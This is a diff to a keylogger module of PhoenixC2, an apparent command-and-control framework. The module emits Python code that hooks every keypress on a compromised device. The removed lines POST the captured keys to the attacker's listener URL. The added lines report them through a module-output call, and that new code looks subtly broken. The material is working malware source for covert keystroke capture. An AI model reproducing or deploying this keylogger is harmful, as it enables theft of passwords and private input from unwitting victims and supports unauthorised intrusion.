@@ -5,6 +5,7 @@ from phoenixc2.server.utils.options import IntegerType, Option, OptionPool
 class Module(BaseModule):
     name = "Keyboard-Capture"
     description = "Capture keyboard input"
+    execution_methods = ["thread"]
     options = OptionPool(
         [
             Option(
@@ -17,23 +18,19 @@ class Module(BaseModule):
         ]
     )
 
-    def code(cls, device, listener, args):
+    def code(cls, device, task):
         return f"""
 import keyboard
 import requests
 import json
 import time
 
-keys = []
-
-def send_data(data):
-    requests.post("{listener.url}/finish/{device.name}", json=data)
+keys = ""
 
 def on_press(key):
-    keys.append(key)
-    if len(keys) > {args["max_keys"]}:
-        send_data(keys)
-        keys.clear()
+    keys += " " + str(key)
+    if len(keys) >= {task.args["max_keys"]}:
+        update_module_output({task.id}, keys)
 
 keyboard.on_press(on_press)
 """
